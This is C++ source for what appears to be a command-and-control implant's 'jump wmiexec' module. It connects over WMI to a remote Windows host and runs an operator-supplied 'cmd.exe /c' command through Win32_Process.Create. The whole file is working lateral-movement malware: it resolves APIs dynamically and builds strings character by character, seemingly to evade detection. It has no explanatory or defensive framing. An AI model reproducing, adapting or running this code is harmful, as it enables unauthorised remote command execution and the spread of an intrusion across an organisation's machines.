#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_JUMP_WMIEXEC

using namespace stardust;
using namespace starburst;

// COM GUIDs
static const GUID CLSID_WbemLocator   = { 0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };
static const GUID IID_IWbemLocator     = { 0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 } };

typedef HRESULT (WINAPI *fnCoInitializeEx)( LPVOID, DWORD );
typedef void    (WINAPI *fnCoUninitialize)( void );
typedef HRESULT (WINAPI *fnCoCreateInstance)( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID* );
typedef HRESULT (WINAPI *fnCoInitializeSecurity)( PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void* );
typedef HRESULT (WINAPI *fnCoSetProxyBlanket)( IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD );

// minimal IWbemLocator vtable
struct IWbemLocatorVtbl {
    void* QueryInterface;
    void* AddRef;
    ULONG (STDMETHODCALLTYPE *Release)( void* );
    HRESULT (STDMETHODCALLTYPE *ConnectServer)( void*, BSTR, BSTR, BSTR, LONG, LONG, BSTR, void*, void** );
};
struct IWbemLocator_s { IWbemLocatorVtbl* lpVtbl; };

// minimal IWbemServices vtable
struct IWbemServicesVtbl {
    void* QueryInterface;
    void* AddRef;
    ULONG (STDMETHODCALLTYPE *Release)( void* );
    void* pad[3]; // OpenNamespace, CancelAsyncCall, QueryObjectSink
    HRESULT (STDMETHODCALLTYPE *GetObject)( void*, BSTR, LONG, void*, void**, void** );
    void* pad2[2]; // GetObjectAsync, PutInstance
    void* pad3[2]; // PutInstanceAsync, DeleteInstance
    void* pad4[2]; // DeleteInstanceAsync, CreateInstanceEnum
    void* pad5[2]; // CreateInstanceEnumAsync, ExecQuery
    void* pad6;    // ExecQueryAsync
    void* pad7;    // ExecNotificationQuery
    void* pad8;    // ExecNotificationQueryAsync
    HRESULT (STDMETHODCALLTYPE *ExecMethod)( void*, BSTR, BSTR, LONG, void*, void*, void**, void** );
};
struct IWbemServices_s { IWbemServicesVtbl* lpVtbl; };

// minimal IWbemClassObject vtable
struct IWbemClassObjectVtbl {
    void* QueryInterface;
    void* AddRef;
    ULONG (STDMETHODCALLTYPE *Release)( void* );
    void* pad[7]; // GetQualifierSet, Get, Put, Delete, GetNames, BeginEnumeration, Next
    void* pad2[3]; // EndEnumeration, GetPropertyQualifierSet, Clone
    void* pad3;    // GetObjectText
    HRESULT (STDMETHODCALLTYPE *SpawnInstance)( void*, LONG, void** );
    void* pad4;    // SpawnDerivedClass
    void* pad5;    // CompareTo
    void* pad6;    // GetPropertyOrigin
    void* pad7b;   // InheritsFrom
    HRESULT (STDMETHODCALLTYPE *GetMethod)( void*, BSTR, LONG, void**, void** );
    HRESULT (STDMETHODCALLTYPE *PutMethod)( void*, BSTR, LONG, void*, void* );
};
struct IWbemClassObject_s { IWbemClassObjectVtbl* lpVtbl; };

typedef BSTR (WINAPI *fnSysAllocString)( const OLECHAR* );
typedef void (WINAPI *fnSysFreeString)( BSTR );

auto declfn starburst::cmd_jump_wmiexec(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );
    if ( !host_str || host_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
        return;
    }

    uint32_t command_len = 0;
    auto command_str = parser_string( params, &command_len );
    if ( !command_str || command_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
        return;
    }

    HMODULE h_ole32 = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "ole32.dll" ) ) );
    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "oleaut32.dll" ) ) );

    if ( !h_ole32 || !h_oleaut32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load COM libraries" ) ) );
        return;
    }

    auto pCoInitializeEx = reinterpret_cast<fnCoInitializeEx>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoInitializeEx" ) ) ) );
    auto pCoUninitialize = reinterpret_cast<fnCoUninitialize>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoUninitialize" ) ) ) );
    auto pCoCreateInstance = reinterpret_cast<fnCoCreateInstance>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoCreateInstance" ) ) ) );
    auto pCoInitializeSecurity = reinterpret_cast<fnCoInitializeSecurity>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoInitializeSecurity" ) ) ) );
    auto pCoSetProxyBlanket = reinterpret_cast<fnCoSetProxyBlanket>(
        inst.kernel32.GetProcAddress( h_ole32,
            symbol<char*>( const_cast<char*>( "CoSetProxyBlanket" ) ) ) );
    auto pSysAllocString = reinterpret_cast<fnSysAllocString>(
        inst.kernel32.GetProcAddress( h_oleaut32,
            symbol<char*>( const_cast<char*>( "SysAllocString" ) ) ) );
    auto pSysFreeString = reinterpret_cast<fnSysFreeString>(
        inst.kernel32.GetProcAddress( h_oleaut32,
            symbol<char*>( const_cast<char*>( "SysFreeString" ) ) ) );

    if ( !pCoInitializeEx || !pCoCreateInstance || !pCoSetProxyBlanket ||
         !pSysAllocString || !pSysFreeString ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve COM APIs" ) ) );
        return;
    }

    HRESULT hr = pCoInitializeEx( nullptr, 0 );

    if ( pCoInitializeSecurity ) {
        pCoInitializeSecurity( nullptr, -1, nullptr, nullptr, 4, 3, nullptr, 0, nullptr );
    }

    // build WMI namespace string: \\HOST\root\cimv2
    wchar_t ns[512] = { '\\', '\\', 0 };
    int ns_idx = 2;
    for ( uint32_t i = 0; i < host_len && ns_idx < 500; i++ )
        ns[ns_idx++] = static_cast<wchar_t>( host_str[i] );
    wchar_t suffix[] = { '\\','r','o','o','t','\\','c','i','m','v','2', 0 };
    for ( int i = 0; suffix[i] && ns_idx < 510; i++ )
        ns[ns_idx++] = suffix[i];
    ns[ns_idx] = 0;

    IWbemLocator_s* pLoc = nullptr;
    hr = pCoCreateInstance( CLSID_WbemLocator, nullptr, 1, IID_IWbemLocator, reinterpret_cast<void**>( &pLoc ) );
    if ( FAILED( hr ) || !pLoc ) {
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CoCreateInstance WbemLocator failed" ) ) );
        return;
    }

    BSTR bstr_ns = pSysAllocString( ns );
    IWbemServices_s* pSvc = nullptr;
    hr = pLoc->lpVtbl->ConnectServer( pLoc, bstr_ns, nullptr, nullptr, 0, 0, nullptr, nullptr, reinterpret_cast<void**>( &pSvc ) );
    pSysFreeString( bstr_ns );

    if ( FAILED( hr ) || !pSvc ) {
        pLoc->lpVtbl->Release( pLoc );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "ConnectServer failed - check perms/network" ) ) );
        return;
    }

    pCoSetProxyBlanket( reinterpret_cast<IUnknown*>( pSvc ), 10, 0, nullptr, 6, 3, nullptr, 0 );

    // Get Win32_Process class
    wchar_t w32p[] = { 'W','i','n','3','2','_','P','r','o','c','e','s','s', 0 };
    BSTR bstr_class = pSysAllocString( w32p );

    IWbemClassObject_s* pClass = nullptr;
    hr = pSvc->lpVtbl->GetObject( pSvc, bstr_class, 0, nullptr, reinterpret_cast<void**>( &pClass ), nullptr );
    if ( FAILED( hr ) || !pClass ) {
        pSysFreeString( bstr_class );
        pSvc->lpVtbl->Release( pSvc );
        pLoc->lpVtbl->Release( pLoc );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetObject Win32_Process failed" ) ) );
        return;
    }

    // Get Create method input params
    wchar_t create_meth[] = { 'C','r','e','a','t','e', 0 };
    BSTR bstr_method = pSysAllocString( create_meth );

    IWbemClassObject_s* pInParams = nullptr;
    hr = pClass->lpVtbl->GetMethod( pClass, bstr_method, 0, reinterpret_cast<void**>( &pInParams ), nullptr );
    if ( FAILED( hr ) || !pInParams ) {
        pSysFreeString( bstr_method );
        pSysFreeString( bstr_class );
        pClass->lpVtbl->Release( pClass );
        pSvc->lpVtbl->Release( pSvc );
        pLoc->lpVtbl->Release( pLoc );
        pCoUninitialize();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetMethod Create failed" ) ) );
        return;
    }

    // Spawn instance and set CommandLine
    IWbemClassObject_s* pInInst = nullptr;
    pInParams->lpVtbl->SpawnInstance( pInParams, 0, reinterpret_cast<void**>( &pInInst ) );

    // build command: cmd.exe /c <command>
    wchar_t w_cmd[2048] = {};
    wchar_t cmd_prefix[] = { 'c','m','d','.','e','x','e',' ','/','c',' ', 0 };
    int cidx = 0;
    for ( ; cmd_prefix[cidx]; cidx++ ) w_cmd[cidx] = cmd_prefix[cidx];
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_cmd + cidx, 2048 - cidx - 1 );

    // Set CommandLine via Put (index 3 in vtable)
    // We need IWbemClassObject::Put which is at vtable index 5
    typedef HRESULT (STDMETHODCALLTYPE *fnPut)( void*, BSTR, LONG, void*, LONG );
    auto pPut = reinterpret_cast<fnPut>( reinterpret_cast<void**>( pInInst->lpVtbl )[5] );

    wchar_t cl_name[] = { 'C','o','m','m','a','n','d','L','i','n','e', 0 };
    BSTR bstr_cl = pSysAllocString( cl_name );
    BSTR bstr_val = pSysAllocString( w_cmd );

    VARIANT var;
    var.vt = VT_BSTR;
    var.bstrVal = bstr_val;

    hr = pPut( pInInst, bstr_cl, 0, &var, 0 );
    pSysFreeString( bstr_cl );

    // Execute Win32_Process.Create
    IWbemClassObject_s* pOutParams = nullptr;
    hr = pSvc->lpVtbl->ExecMethod( pSvc, bstr_class, bstr_method, 0, nullptr,
        pInInst, reinterpret_cast<void**>( &pOutParams ), nullptr );

    pSysFreeString( bstr_val );
    pSysFreeString( bstr_method );
    pSysFreeString( bstr_class );

    if ( pOutParams ) pOutParams->lpVtbl->Release( pOutParams );
    if ( pInInst )    pInInst->lpVtbl->Release( pInInst );
    if ( pInParams )  pInParams->lpVtbl->Release( pInParams );
    pClass->lpVtbl->Release( pClass );
    pSvc->lpVtbl->Release( pSvc );
    pLoc->lpVtbl->Release( pLoc );
    pCoUninitialize();

    if ( SUCCEEDED( hr ) ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "process created via WMI" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "WMI ExecMethod failed" ) ) );
    }
}

#endif
